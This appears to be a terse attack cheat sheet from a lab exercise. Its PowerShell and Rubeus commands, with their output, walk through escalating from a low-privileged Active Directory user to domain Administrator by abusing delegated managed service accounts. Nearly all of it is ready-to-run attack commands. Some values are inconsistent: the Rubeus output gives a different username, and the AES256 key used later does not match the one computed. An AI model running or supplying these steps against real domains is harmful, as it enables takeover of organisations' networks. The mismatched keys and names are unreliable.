A low privilege user with CreateChild permissions over any Organizational Unit (OU) in the Active Directory domain with write access on a target object can perform account takeover.

```
SharpSuccessor.exe add /impersonate:Administrator /path:"ou=test,dc=lab,dc=lan" /account:jdoe /name:attacker_dMSA
```

## Manual

```
New-ADComputer -Name OwnedMachine -SamAccountName "OwnedMachine$" -AccountPassword (ConvertTo-SecureString -String "Password@123" -AsPlainText -Force) -Enabled $true -Path "OU=Staff,DC=eighteen,DC=htb" -PassThru -Server "DC01"


DistinguishedName : CN=OwnedMachine,OU=Staff,DC=eighteen,DC=htb
DNSHostName       :
Enabled           : True
Name              : OwnedMachine
ObjectClass       : computer
ObjectGUID        : 089dfa57-0df4-440c-ba36-814927af6926
SamAccountName    : OwnedMachine$
SID               : S-1-5-21-1152179935-589108180-1989892463-12113
UserPrincipalName :
```

```
.\Rubeus.exe hash /password:Password@123 /user:OwnedMachine$ /domain:eighteen.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


[*] Action: Calculate Password Hash(es)

[*] Input password             : Password@123
[*] Input username             : OwnerMachine$
[*] Input domain               : eighteen.htb
[*] Salt                       : EIGHTEEN.HTBhostownermachine.eighteen.htb
[*]       rc4_hmac             : A29F7623FD11550DEF0192DE9246F46B
[*]       aes128_cts_hmac_sha1 : 21E0BC0F188DA8E8A8FEF2FFAD82FB5C
[*]       aes256_cts_hmac_sha1 : E0A984C0FBDBB5B6BEF2E59C5B9AF11A750F8FFFD81B213D9C5CDAF902E944ED
[*]       des_cbc_md5          : EFFBD0A829911A8A

```

```
Import-Module ActiveDirectory
New-AdServiceAccount -Name "pen_dmsa" -DNSHostName "eighteen.htb" -CreateDelegatedServiceAccount -PrincipalsAllowedToRetrieveManagedPassword "OwnedMachine$" -Path "OU=Staff,DC=eighteen,DC=htb"
```

```
$sid = (Get-AdUser -Identity "adam.scott").SID
$acl = Get-Acl "AD:\CN=pen_dmsa,OU=Staff,DC=eighteen,DC=htb"
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid, "GenericAll", "Allow"
$acl.AddAccessRule($rule)
Set-Acl -Path "AD:\CN=pen_dmsa,OU=Staff,DC=eighteen,DC=htb" -AclObject $acl
```

```
Set-ADServiceAccount -Identity pen_dmsa -Replace @{'msDS-ManagedAccountPrecededByLink' = 'CN=Administrator,CN=Users,DC=eighteen,DC=htb'}
Set-ADServiceAccount -Identity pen_dmsa -Replace @{'msDS-DelegatedMSAState' = 2}
```

```
Get-ADServiceAccount -Identity pen_dmsa -Properties msDS-ManagedAccountPrecededByLink, msDS-DelegatedMSAState | Select-Object Name, msDS-ManagedAccountPrecededByLink, msDS-DelegatedMSAState

Name       msDS-ManagedAccountPrecededByLink            msDS-DelegatedMSAState
----       ---------------------------------            ----------------------
pen_dmsa CN=Administrator,CN=Users,DC=eighteen,DC=htb                      2

```

```
.\Rubeus.exe asktgt /user:OwnedMachine$ /aes256:BFF2D37F46DA14B0371215FA9494835557CB5FCA5A89A6DBA92B29975B401860 /domain:eighteen /nowrap
```

```
.\Rubeus.exe asktgs /targetuser:pen_dmsa$ /service:krbtgt/eighteen.htb /dmsa /enctype:aes256 /opsec /ptt /ticket:doI.....
```

```
.\Rubeus.exe asktgs /user:pen_dmsa$ /service:cifs/DC01.eighteen.htb /opsec /dmsa /nowrap /ptt /ticket:ticket.kirbi
```
